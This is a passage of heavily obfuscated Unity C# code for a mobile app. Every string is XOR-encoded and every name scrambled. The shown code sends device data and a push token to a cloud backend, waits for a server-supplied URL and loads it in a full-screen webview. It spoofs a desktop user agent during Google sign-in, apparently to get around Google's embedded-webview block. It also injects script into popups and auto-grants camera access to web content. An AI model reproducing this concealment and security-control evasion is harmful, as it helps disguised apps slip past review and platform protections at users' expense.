                _0x1021fa71?._0xa47995de();
                return true;
            }
        }
        while (!_0x9c6d625d);
        return false;
    }

    private int _0x65261fd2 = -1;
    private async Task<bool> _0xb55813d2()
    {
        _0x730e833b.Instance?._0xac2c48c6();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x2fded714) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[32] { 184, 183, 134, 144, 151, 190, 195, 182, 141, 138, 151, 154, 195, 179, 150, 144, 139, 195, 173, 140, 151, 138, 133, 138, 128, 130, 151, 138, 140, 141, 217, 195 }, 227) + string.Join(_0x581f7fed._0x77e9fe38(new byte[1] { 119 }, 126), _0x2fded714));
                }
#endif
            }
        };
        try
        {
            _0xef613450 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[31] { 22, 25, 40, 62, 57, 16, 109, 11, 44, 36, 33, 40, 41, 109, 57, 34, 109, 42, 40, 57, 109, 61, 56, 62, 37, 109, 57, 34, 38, 40, 35 }, 77));
                }
#endif
            }

            _0xef613450 = "";
        }

        _0x974c5373 = !string.IsNullOrEmpty(_0xef613450);
        _0x9140e84e = _0xe9832efe();
        {
#if B_LOGS
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[25] { 101, 106, 91, 77, 74, 99, 30, 107, 80, 87, 74, 71, 30, 110, 75, 77, 86, 30, 106, 81, 85, 91, 80, 4, 30 }, 62) + _0xef613450);
#endif
        }

        _0x730e833b.Instance?._0x56569c2e();
        return false;
    }

    private bool _0xd7bbee86()
    {
        if (_0xe53359ad())
            return true;
        if (_0xa3c94682 != null && _0xa3c94682.CanGoBack)
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[36] { 224, 201, 218, 204, 223, 201, 218, 205, 136, 202, 201, 203, 195, 136, 133, 150, 136, 197, 201, 193, 198, 136, 255, 205, 202, 254, 193, 205, 223, 136, 239, 199, 234, 201, 203, 195 }, 168));
            _0xa3c94682.GoBack();
            return true;
        }

        return false;
    }

    private string _0xba569bba = "";
    private bool OpenUrlExternally(string _0x414fd3f0)
    {
        return _0xb65ff173(_0x414fd3f0);
    }

    private int _0x7abbeb00 = 0;
    private bool _0xdce2dcf4 = false;
    private GameObject _0x7bf23493;
    private bool _0x9d250863 = false;
    private string _0x66ac1bd5 = "";
    private static string ReadPushField(Dictionary<string, object> _0x4c04426e, string _0xb27521c5)
    {
        if (_0x4c04426e == null || string.IsNullOrEmpty(_0xb27521c5))
            return string.Empty;
        if (_0x4c04426e.TryGetValue(_0x581f7fed._0x77e9fe38(new byte[16] { 160, 161, 186, 167, 168, 167, 173, 175, 186, 167, 161, 160, 138, 175, 186, 175 }, 206), out var raw))
        {
            try
            {
                var _0x3510c094 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x3510c094 != null && _0x3510c094.TryGetValue(_0xb27521c5, out var nestedVal))
                {
                    var _0xd0100bd8 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0xd0100bd8))
                        return _0xd0100bd8;
                }
            }
            catch
            {
            }
        }

        if (_0x4c04426e.TryGetValue(_0xb27521c5, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private string _0x5ecc042f;
    private void _0x76e89196(UniWebView _0x9e9e5a2d)
    {
        if (_0x9d250863)
            return;
        _0x9d250863 = true;
        _0x9e9e5a2d.AddUrlScheme(_0x581f7fed._0x77e9fe38(new byte[2] { 181, 166 }, 193));
        _0x9e9e5a2d.AddUrlScheme(_0x581f7fed._0x77e9fe38(new byte[6] { 234, 237, 247, 230, 237, 247 }, 131));
        _0x9e9e5a2d.AddUrlScheme(_0x581f7fed._0x77e9fe38(new byte[6] { 93, 81, 66, 91, 85, 68 }, 48));
        _0x9e9e5a2d.OnMessageReceived += (_0xb6102a2a, _0x153af057) =>
        {
            if (TryOpenExternalLikeChrome(_0x153af057.RawMessage))
            {
                _0x2c009d27(false);
                return;
            }
        };
        _0x9e9e5a2d.RegisterShouldHandleRequest(_0xa2132d6f =>
        {
            string _0xbdbd7cc8 = _0xa2132d6f != null ? _0xa2132d6f.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xbdbd7cc8))
                return true;
            WLog(_0x581f7fed._0x77e9fe38(new byte[21] { 222, 229, 226, 248, 225, 233, 197, 236, 227, 233, 225, 232, 223, 232, 252, 248, 232, 254, 249, 183, 173 }, 141) + _0xbdbd7cc8);
            if (TryOpenExternalLikeChrome(_0xbdbd7cc8))
            {
                _0x2c009d27(false);
                return false;
            }

            if (_0xa2132d6f != null && _0xa2132d6f.IsMainFrame && IsGoogleAuthFlowUrl(_0xbdbd7cc8) && !_0xbf1779c9)
            {
                WLog(_0x581f7fed._0x77e9fe38(new byte[62] { 179, 159, 151, 144, 222, 169, 155, 156, 168, 151, 155, 137, 222, 154, 155, 138, 155, 157, 138, 155, 154, 222, 185, 145, 145, 153, 146, 155, 222, 159, 139, 138, 150, 222, 171, 172, 178, 222, 211, 192, 222, 140, 155, 146, 145, 159, 154, 222, 137, 151, 138, 150, 222, 185, 145, 145, 153, 146, 155, 222, 171, 191 }, 254));
                _0xbf1779c9 = true;
                _0x2c009d27(true);
                _0xa3c94682.SetUserAgent(_0xbd48b76f());
                _0xa3c94682.Load(_0xbdbd7cc8);
                return false;
            }

            return true;
        });
        _0x9e9e5a2d.OnLoadingErrorReceived += (_0xb6102a2a, _0x125b87d6, _0x153af057, _0xdc1e8802) =>
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[25] { 251, 215, 223, 216, 150, 225, 211, 212, 224, 223, 211, 193, 150, 243, 196, 196, 217, 196, 140, 150, 213, 217, 210, 211, 139 }, 182) + _0x125b87d6 + _0x581f7fed._0x77e9fe38(new byte[9] { 20, 89, 81, 71, 71, 85, 83, 81, 9 }, 52) + _0x153af057);
            string _0x1cec2967 = GetFailingUrl(_0xdc1e8802);
            if (string.IsNullOrEmpty(_0x1cec2967) || IsAboutBlank(_0x1cec2967))
                return;
            _ = _0x5bea883c(_0x581f7fed._0x77e9fe38(new byte[8] { 21, 20, 61, 7, 16, 16, 13, 16 }, 98));
            WLog(_0x581f7fed._0x77e9fe38(new byte[45] { 144, 188, 180, 179, 253, 138, 184, 191, 139, 180, 184, 170, 253, 187, 188, 180, 177, 180, 179, 186, 253, 136, 143, 145, 253, 240, 227, 253, 178, 173, 184, 179, 253, 184, 165, 169, 184, 175, 179, 188, 177, 177, 164, 231, 253 }, 221) + _0x1cec2967);
            StopCurrentFailedLoad(_0xb6102a2a);
            _0x7929b18d(_0x1cec2967);
        };
        _0x9e9e5a2d.OnPageStarted += (_0xb6102a2a, _0x9bde8ded) =>
        {
            _0x7abbeb00 = 0;
            if (_0xee95cc91 && IsAboutBlank(_0x9bde8ded))
            {
                WLog(_0x581f7fed._0x77e9fe38(new byte[27] { 245, 215, 192, 210, 196, 215, 200, 133, 196, 199, 202, 208, 209, 159, 199, 201, 196, 203, 206, 133, 214, 209, 196, 215, 209, 192, 193 }, 165));
                return;
            }

            WLog(_0x581f7fed._0x77e9fe38(new byte[29] { 212, 248, 240, 247, 185, 206, 252, 251, 207, 240, 252, 238, 185, 214, 247, 201, 248, 254, 252, 202, 237, 248, 235, 237, 252, 253, 163, 185, 178 }, 153) + (Time.realtimeSinceStartup - _0x3d313e01).ToString(_0x581f7fed._0x77e9fe38(new byte[5] { 17, 15, 17, 17, 17 }, 33)) + _0x581f7fed._0x77e9fe38(new byte[2] { 128, 211 }, 243) + _0x9bde8ded);
            if (TryOpenExternalLikeChrome(_0x9bde8ded))
            {
                StopCurrentFailedLoad(_0xb6102a2a);
                return;
            }

            if (ContainsIgnoreCase(_0x9bde8ded, _0x581f7fed._0x77e9fe38(new byte[8] { 164, 169, 169, 161, 238, 161, 176, 176 }, 192)) || ContainsIgnoreCase(_0x9bde8ded, _0x581f7fed._0x77e9fe38(new byte[15] { 156, 141, 149, 194, 155, 133, 136, 139, 137, 152, 194, 142, 128, 131, 139 }, 236)) || _0x9bde8ded.StartsWith(_0x581f7fed._0x77e9fe38(new byte[25] { 173, 177, 177, 181, 182, 255, 234, 234, 167, 181, 162, 169, 170, 167, 164, 169, 163, 164, 179, 235, 169, 172, 179, 160, 234 }, 197), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0xb6102a2a);
                OpenUrlExternally(_0x9bde8ded);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x9bde8ded))
            {
                _0x2c009d27(true);
                WLog(_0x581f7fed._0x77e9fe38(new byte[41] { 201, 225, 225, 233, 226, 235, 174, 239, 251, 250, 230, 174, 232, 226, 225, 249, 174, 234, 235, 250, 235, 237, 250, 235, 234, 174, 163, 176, 174, 229, 235, 235, 254, 174, 248, 231, 253, 231, 236, 226, 235 }, 142));
                return;
            }

            _0x7b7b708b = true;
            _0x2c009d27(true);
            WLog(_0x581f7fed._0x77e9fe38(new byte[43] { 235, 217, 222, 234, 213, 217, 203, 156, 208, 211, 221, 216, 213, 210, 219, 147, 206, 217, 216, 213, 206, 217, 223, 200, 213, 210, 219, 156, 145, 130, 156, 215, 217, 217, 204, 156, 202, 213, 207, 213, 222, 208, 217 }, 188));
        };
        _0x9e9e5a2d.OnPageCommitted += (_0xb6102a2a, _0x9bde8ded) =>
        {
            if (_0xee95cc91 && IsAboutBlank(_0x9bde8ded))
                return;
            WLog(_0x581f7fed._0x77e9fe38(new byte[31] { 71, 107, 99, 100, 42, 93, 111, 104, 92, 99, 111, 125, 42, 69, 100, 90, 107, 109, 111, 73, 101, 103, 103, 99, 126, 126, 111, 110, 48, 42, 33 }, 10) + (Time.realtimeSinceStartup - _0x3d313e01).ToString(_0x581f7fed._0x77e9fe38(new byte[5] { 25, 7, 25, 25, 25 }, 41)) + _0x581f7fed._0x77e9fe38(new byte[2] { 87, 4 }, 36) + _0x9bde8ded);
            if (!firstLoadShown && IsHttpUrl(_0x9bde8ded))
            {
                firstLoadShown = true;
                _0x7b7b708b = false;
                _0x2c009d27(false);
                _0x46028131();
                _0x73100cc9();
                _0xb6102a2a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x5bea883c(_0x581f7fed._0x77e9fe38(new byte[9] { 37, 36, 13, 61, 34, 55, 60, 55, 54 }, 82));
                WLog(_0x581f7fed._0x77e9fe38(new byte[39] { 225, 205, 197, 194, 140, 251, 201, 206, 250, 197, 201, 219, 140, 223, 196, 195, 219, 194, 140, 195, 194, 140, 207, 195, 193, 193, 197, 216, 216, 201, 200, 140, 207, 195, 194, 216, 201, 194, 216 }, 172));
            }
        };
        _0x9e9e5a2d.OnPageProgressChanged += (_0xb6102a2a, _0x2437548e) =>
        {
            if (_0xee95cc91)
                return;
            if (!firstLoadShown && _0x2437548e >= 0.65f)
            {
                firstLoadShown = true;
                _0x7b7b708b = false;
                _0x2c009d27(false);
                _0x46028131();
                _0x73100cc9();
                _0xb6102a2a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x5bea883c(_0x581f7fed._0x77e9fe38(new byte[9] { 68, 69, 108, 92, 67, 86, 93, 86, 87 }, 51));
                WLog(_0x581f7fed._0x77e9fe38(new byte[32] { 152, 180, 188, 187, 245, 130, 176, 183, 131, 188, 176, 162, 245, 166, 189, 186, 162, 187, 245, 183, 172, 245, 165, 167, 186, 178, 167, 176, 166, 166, 239, 245 }, 213) + _0x2437548e);
            }
        };
        _0x9e9e5a2d.OnPageFinished += (_0xb6102a2a, _0x125b87d6, _0x9bde8ded) =>
        {
            if (_0xee95cc91 && IsAboutBlank(_0x9bde8ded))
            {
                _0xee95cc91 = false;
                WLog(_0x581f7fed._0x77e9fe38(new byte[28] { 113, 83, 68, 86, 64, 83, 76, 1, 64, 67, 78, 84, 85, 27, 67, 77, 64, 79, 74, 1, 71, 72, 79, 72, 82, 73, 68, 69 }, 33));
                return;
            }

            WLog(_0x581f7fed._0x77e9fe38(new byte[24] { 73, 101, 109, 106, 36, 83, 97, 102, 82, 109, 97, 115, 36, 66, 109, 106, 109, 119, 108, 97, 96, 62, 36, 47 }, 4) + (Time.realtimeSinceStartup - _0x3d313e01).ToString(_0x581f7fed._0x77e9fe38(new byte[5] { 46, 48, 46, 46, 46 }, 30)) + _0x581f7fed._0x77e9fe38(new byte[7] { 31, 76, 15, 3, 8, 9, 81 }, 108) + _0x125b87d6 + _0x581f7fed._0x77e9fe38(new byte[5] { 65, 20, 19, 13, 92 }, 97) + _0x9bde8ded);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x7b7b708b = false;
                _0x2c009d27(false);
                _0x46028131();
                _0x73100cc9();
                _0xb6102a2a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x5bea883c(_0x581f7fed._0x77e9fe38(new byte[9] { 9, 8, 33, 17, 14, 27, 16, 27, 26 }, 126));
                WLog(_0x581f7fed._0x77e9fe38(new byte[33] { 223, 243, 251, 252, 178, 197, 247, 240, 196, 251, 247, 229, 178, 244, 251, 224, 225, 230, 178, 254, 253, 243, 246, 178, 241, 253, 255, 226, 254, 247, 230, 247, 246 }, 146));
            }
            else if (_0x7b7b708b)
            {
                _0x7b7b708b = false;
                _0x2c009d27(false);
                _0xb6102a2a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x581f7fed._0x77e9fe38(new byte[40] { 185, 149, 157, 154, 212, 163, 145, 150, 162, 157, 145, 131, 212, 167, 156, 155, 131, 212, 149, 146, 128, 145, 134, 212, 152, 155, 149, 144, 157, 154, 147, 212, 146, 157, 154, 157, 135, 156, 145, 144 }, 244));
            }
            else
            {
                _0x2c009d27(false);
            }

            if (_0xbf1779c9 && !IsGoogleAuthFlowUrl(_0x9bde8ded) && !IsGoogleAuthFlowUrl(_0x9bde8ded))
            {
                WLog(_0x581f7fed._0x77e9fe38(new byte[48] { 95, 119, 119, 127, 116, 125, 56, 121, 109, 108, 112, 56, 107, 125, 125, 117, 107, 56, 126, 113, 118, 113, 107, 112, 125, 124, 56, 53, 38, 56, 106, 125, 107, 108, 119, 106, 125, 56, 124, 125, 126, 121, 109, 116, 108, 56, 77, 89 }, 24));
                _0xbf1779c9 = false;
                _0xa3c94682.SetUserAgent("");
            }
        };
        _0x9e9e5a2d.OnShouldClose += _0xb6102a2a =>
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[41] { 52, 59, 10, 28, 27, 50, 79, 34, 14, 6, 1, 79, 56, 10, 13, 57, 6, 10, 24, 79, 32, 1, 60, 7, 0, 26, 3, 11, 44, 3, 0, 28, 10, 79, 6, 1, 25, 0, 4, 10, 11 }, 111));
            _0x096a539a();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x9e9e5a2d.SetPopupPageEventEnabled(true);
        bool _0xd4ff620e = false;
        bool _0x73659af2 = false;
        _0x9e9e5a2d.OnMultipleWindowOpened += (_0xb6102a2a, _0x57b62b89) =>
        {
            _0xb6102a2a.ScrollTo(0, 0, false);
            WLog(_0x581f7fed._0x77e9fe38(new byte[43] { 38, 41, 24, 14, 9, 32, 93, 48, 28, 20, 19, 93, 42, 24, 31, 43, 20, 24, 10, 93, 48, 8, 17, 9, 20, 13, 17, 24, 42, 20, 19, 25, 18, 10, 93, 50, 13, 24, 19, 24, 25, 71, 93 }, 125) + _0x57b62b89);
            var _0x8e4df367 = _0x9e9e5a2d.GetPopupWindow(_0x57b62b89);
            if (_0x8e4df367 == null)
                return;
            _0x1c5e0b7d.Add(_0x8e4df367);
            Debug.Log($"[Test] Popup ID: {_0x8e4df367.Id}");
            _0x8e4df367.OnPageStarted += (_0xea8830a1, _0x9bde8ded) =>
            {
                WLog(_0x581f7fed._0x77e9fe38(new byte[36] { 103, 104, 89, 79, 72, 97, 28, 108, 83, 76, 73, 76, 28, 107, 89, 94, 106, 85, 89, 75, 28, 115, 82, 108, 93, 91, 89, 111, 72, 93, 78, 72, 89, 88, 6, 28 }, 60) + _0x9bde8ded);
                _0x7abbeb00 = 0;
                if (string.IsNullOrEmpty(_0x9bde8ded) || IsAboutBlank(_0x9bde8ded))
                    return;
                if (IsGoogleAuthFlowUrl(_0x9bde8ded))
                {
                    WLog(_0x581f7fed._0x77e9fe38(new byte[57] { 96, 111, 94, 72, 79, 102, 27, 107, 84, 75, 78, 75, 27, 124, 84, 84, 92, 87, 94, 27, 90, 78, 79, 83, 27, 93, 87, 84, 76, 27, 22, 5, 27, 72, 75, 84, 84, 93, 27, 124, 84, 84, 92, 87, 94, 27, 120, 83, 73, 84, 86, 94, 27, 110, 122, 1, 27 }, 59) + _0x9bde8ded);
                    _0xd4ff620e = false;
                    _0xd85a1fe7();
                    if (_0xea8830a1 != null && _0xea8830a1.IsAlive)
                        _0xea8830a1.EvaluateJavaScript(_0xac5b0bf8());
                    return;
                }

                if (_0xa3c94682 == null)
                    return;
                if (!_0xd4ff620e)
                {
                    _0xd4ff620e = true;
                    _0xa3c94682.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x581f7fed._0x77e9fe38(new byte[39] { 6, 9, 56, 46, 41, 0, 125, 13, 50, 45, 40, 45, 125, 60, 45, 45, 49, 36, 125, 10, 52, 51, 57, 50, 42, 46, 125, 57, 56, 46, 54, 41, 50, 45, 125, 8, 28, 103, 125 }, 93) + _0x9bde8ded);
                }

                if (_0xea8830a1 != null && _0xea8830a1.IsAlive)
                    _0xea8830a1.EvaluateJavaScript(_0x8a767fe7());
                if (!_0x73659af2 && _0xea8830a1 != null && _0xea8830a1.IsAlive && IsHttpUrl(_0x9bde8ded))
                {
                    _0x73659af2 = true;
                }
            };
            _0x8e4df367.OnPageFinished += (_0xea8830a1, _0xdc1e8802) =>
            {
                string _0x5bff12d2 = _0xdc1e8802 != null ? _0xdc1e8802.data : string.Empty;
                WLog(_0x581f7fed._0x77e9fe38(new byte[35] { 130, 141, 188, 170, 173, 132, 249, 137, 182, 169, 172, 169, 249, 142, 188, 187, 143, 176, 188, 174, 249, 159, 176, 183, 176, 170, 177, 188, 189, 227, 249, 172, 171, 181, 228 }, 217) + _0x5bff12d2);
                if (_0xea8830a1 == null || !_0xea8830a1.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x5bff12d2))
                {
                    _0xd85a1fe7();
                    _0xea8830a1.EvaluateJavaScript(_0xac5b0bf8());
                    return;
                }

                if (!_0xd4ff620e)
                    return;
                _0xea8830a1.EvaluateJavaScript(_0x8a767fe7());
            };
        };
        _0x9e9e5a2d.OnMultipleWindowClosed += (_0xb6102a2a, _0x57b62b89) =>
        {
            _0x1c5e0b7d.RemoveAll(_0xa6e6b25d => _0xa6e6b25d == null || _0xa6e6b25d.Id == _0x57b62b89 || !_0xa6e6b25d.IsAlive);
            _0x2c009d27(false);
            if (_0x1c5e0b7d.Count == 0 && _0xa3c94682 != null)
            {
                _0xd4ff620e = false;
                _0x73659af2 = false;
                _0xbcd2e438();
            }

            WLog(_0x581f7fed._0x77e9fe38(new byte[43] { 224, 239, 222, 200, 207, 230, 155, 246, 218, 210, 213, 155, 236, 222, 217, 237, 210, 222, 204, 155, 246, 206, 215, 207, 210, 203, 215, 222, 236, 210, 213, 223, 212, 204, 155, 248, 215, 212, 200, 222, 223, 129, 155 }, 187) + _0x57b62b89);
        };
        _0x9e9e5a2d.RegisterOnRequestMediaCapturePermission(_0xa2132d6f =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private static readonly string WindowsDesktopUserAgent = _0x581f7fed._0x77e9fe38(new byte[111] { 170, 136, 157, 142, 139, 139, 134, 200, 210, 201, 215, 199, 207, 176, 142, 137, 131, 136, 144, 148, 199, 169, 179, 199, 214, 215, 201, 215, 220, 199, 176, 142, 137, 209, 211, 220, 199, 159, 209, 211, 206, 199, 166, 151, 151, 139, 130, 176, 130, 133, 172, 142, 147, 200, 210, 212, 208, 201, 212, 209, 199, 207, 172, 175, 179, 170, 171, 203, 199, 139, 142, 140, 130, 199, 160, 130, 132, 140, 136, 206, 199, 164, 143, 149, 136, 138, 130, 200, 214, 213, 215, 201, 215, 201, 215, 201, 215, 199, 180, 134, 129, 134, 149, 142, 200, 210, 212, 208, 201, 212, 209 }, 231);
    private Text _0x09cda234;
    private AndroidJavaObject _0xa9b377c1 { get; set; }
    // MAIN FLOW
    private bool _0x178f9092 { get; set; }

    private string _0x5371514d(string _0xaa1adc82, string _0xf12a9cb2)
    {
        if (string.IsNullOrEmpty(_0xf12a9cb2))
            return _0xaa1adc82;
        if (_0xaa1adc82.Contains(_0x581f7fed._0x77e9fe38(new byte[1] { 221 }, 226)))
            return _0xaa1adc82 + _0x581f7fed._0x77e9fe38(new byte[8] { 146, 199, 209, 218, 208, 221, 208, 137 }, 180) + UnityWebRequest.EscapeURL(_0xf12a9cb2);
        else
            return _0xaa1adc82 + _0x581f7fed._0x77e9fe38(new byte[8] { 206, 130, 148, 159, 149, 152, 149, 204 }, 241) + UnityWebRequest.EscapeURL(_0xf12a9cb2);
    }

    private string _0xcd4c20b4 = "";
    private string _0xf27eddbe = "";
    private bool _0x696f0961 = false;
    internal void Update()
    {
        if (_0xa3c94682 == null)
            return;
        if (_0x99140284())
            _0x096a539a();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x73100cc9();
        if (_0xdce2dcf4 && _0xa91c9a08 != null)
            _0xa91c9a08.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    internal bool firstLoadShown = false;
    private float _0x3d313e01 = 0f;
    private bool _0xee378b75 = false;
    private async Task _0xa5b82aee()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0xb6cf0bf0 = _0x581f7fed._0x77e9fe38(new byte[5] { 50, 53, 56, 39, 49 }, 84);
        _0x3d43fe02 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x23445773 = DateTime.UtcNow.Ticks.ToString();
        _0x857682dc = "";
        JObject _0xacfc6868 = _0x2585d8c2(_0x24d000f7, _0x23a128a6, _0x46f7efa9, _0xef613450, _0x2efd6b96, _0x2fc2626c, _0xfae94595, _0xba569bba, _0x66ac1bd5, _0xe33cc25c, _0xb6cf0bf0, _0x857682dc, _0xcd4c20b4, _0x06d4621c, _0xfae224ea.ToString(), _0xa36d68f7, _0x23445773, _0x3d43fe02, _0x5ab207e8, _0xf27eddbe, _0x18a598fc, _0x9140e84e, _0xe9832efe());
        var _0x1529f03b = _0x0ddb8d03(_0xacfc6868.ToString(), _0x5ab207e8);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xacfc6868}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x581f7fed._0x77e9fe38(new byte[7] { 105, 120, 96, 117, 118, 120, 125 }, 25) + _0x5ab207e8, _0x1529f03b } });
            await Task.Delay(500);
            string _0x2cec2b02 = "";
            for (int _0xc1b0b627 = 0; _0xc1b0b627 < 20; _0xc1b0b627++)
            {
                if (await _0x7a461df0(1, 1))
                {
                    await _0x5bea883c(_0x581f7fed._0x77e9fe38(new byte[7] { 171, 165, 166, 170, 162, 172, 173 }, 201));
                    _0xa47995de();
                    return;
                }

                _0x2cec2b02 = await _0xe7ce4d31(1, 500);
                if (!string.IsNullOrEmpty(_0x2cec2b02))
                    break;
            }

            _0xc4dec3c4(_0x2cec2b02);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[22] { 75, 68, 85, 67, 68, 77, 48, 87, 117, 126, 117, 98, 113, 124, 48, 117, 98, 98, 127, 98, 42, 48 }, 16) + e.Message);
#endif
            }

            _0xa47995de();
        }
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0xa47995de();
    }

    private bool _0xb65ff173(string _0x661ee69f)
    {
        try
        {
            using (var _0x9faf4d26 = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[30] { 124, 112, 114, 49, 106, 113, 118, 107, 102, 44, 123, 49, 111, 115, 126, 102, 122, 109, 49, 74, 113, 118, 107, 102, 79, 115, 126, 102, 122, 109 }, 31)))
            using (var _0x5d3f6bc4 = _0x9faf4d26.GetStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 140, 154, 157, 157, 138, 129, 155, 174, 140, 155, 134, 153, 134, 155, 150 }, 239)))
            using (var _0xabb2309b = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[15] { 241, 254, 244, 226, 255, 249, 244, 190, 254, 245, 228, 190, 197, 226, 249 }, 144)))
            using (var _0xaacb2498 = _0xabb2309b.CallStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[5] { 69, 84, 71, 70, 80 }, 53), _0x661ee69f))
            using (var _0xf3c64807 = new AndroidJavaObject(_0x581f7fed._0x77e9fe38(new byte[22] { 225, 238, 228, 242, 239, 233, 228, 174, 227, 239, 238, 244, 229, 238, 244, 174, 201, 238, 244, 229, 238, 244 }, 128), _0x581f7fed._0x77e9fe38(new byte[26] { 203, 196, 206, 216, 197, 195, 206, 132, 195, 196, 222, 207, 196, 222, 132, 203, 201, 222, 195, 197, 196, 132, 252, 227, 239, 253 }, 170), _0xaacb2498))
            {
                WLog(_0x581f7fed._0x77e9fe38(new byte[26] { 51, 24, 2, 31, 29, 21, 60, 25, 27, 21, 80, 31, 0, 21, 30, 80, 21, 8, 4, 21, 2, 30, 17, 28, 74, 80 }, 112) + _0x661ee69f);
                _0xf3c64807.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[11] { 183, 178, 178, 149, 183, 162, 179, 177, 185, 164, 175 }, 214), _0x581f7fed._0x77e9fe38(new byte[33] { 154, 149, 159, 137, 148, 146, 159, 213, 146, 149, 143, 158, 149, 143, 213, 152, 154, 143, 158, 156, 148, 137, 130, 213, 185, 169, 180, 172, 168, 186, 185, 183, 190 }, 251));
                _0xf3c64807.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[8] { 214, 211, 211, 241, 219, 214, 208, 196 }, 183), 0x10000000);
                _0x5d3f6bc4.Call(_0x581f7fed._0x77e9fe38(new byte[13] { 173, 170, 191, 172, 170, 159, 189, 170, 183, 168, 183, 170, 167 }, 222), _0xf3c64807);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[28] { 240, 219, 193, 220, 222, 214, 255, 218, 216, 214, 147, 214, 203, 199, 214, 193, 221, 210, 223, 147, 213, 210, 218, 223, 214, 215, 137, 147 }, 179) + e.Message);
            Application.OpenURL(_0x661ee69f);
            return true;
        }
    }

    private int _0x00960851 = 5, _0x7f2ba76b = 5, _0x8226b905 = 5, _0xe4165ede = 5;
    private IEnumerator _0x08f4b0eb(string _0xf5ae9fab)
    {
        if (_0xa3c94682 != null && _0xae32ae48)
            yield break;
        _0xa3c94682 = gameObject.AddComponent<UniWebView>();
        _0x20e7495a(_0xa3c94682);
        _0x76e89196(_0xa3c94682);
        _0xa3c94682.BackgroundColor = Color.clear;
        var _0x4de358d2 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x73100cc9();
        yield return new WaitForEndOfFrame();
        _0xae32ae48 = true;
        _0x635c034f();
        _0x2c009d27(true);
        _0xee95cc91 = false;
        _0xbf1779c9 = false;
        _0x1c5e0b7d.Clear();
        _0x65261fd2 = -1;
        firstLoadShown = false;
        _0x7b7b708b = false;
        _0x3c978867 = false;
        _0xa3c94682.SetUserAgent("");
        _0x3d313e01 = Time.realtimeSinceStartup;
        _0xa3c94682.Stop();
        _0xa3c94682.Load(_0xf5ae9fab);
        _0xa3c94682.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x581f7fed._0x77e9fe38(new byte[25] { 90, 118, 126, 121, 55, 64, 114, 117, 65, 126, 114, 96, 55, 94, 121, 126, 99, 126, 118, 123, 55, 68, 127, 120, 96 }, 23));
    }

    private string _0xe33cc25c = "";
    private Canvas _0x558e15c8()
    {
        if (_0x28abe308 != null)
            return _0x28abe308;
        var _0x77e97f12 = gameObject.GetComponentInChildren<Canvas>();
        if (_0x77e97f12 == null)
        {
            var _0x55e29b09 = new GameObject(_0x581f7fed._0x77e9fe38(new byte[6] { 182, 148, 155, 131, 148, 134 }, 245), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x77e97f12 = _0x55e29b09.GetComponent<Canvas>();
            _0x77e97f12.transform.SetParent(transform, false);
            _0x77e97f12.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x28abe308 = _0x77e97f12;
        return _0x28abe308;
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0xa3c94682 = null;
    private bool _0xf5cd9133(int _0xeb12af07, string _0xc6a8cd1e, string _0x7a45b379)
    {
        if (string.IsNullOrEmpty(_0x7a45b379))
            return false;
        if (!IsHttpUrl(_0x7a45b379))
            return true;
        if (string.IsNullOrEmpty(_0xc6a8cd1e))
            return false;
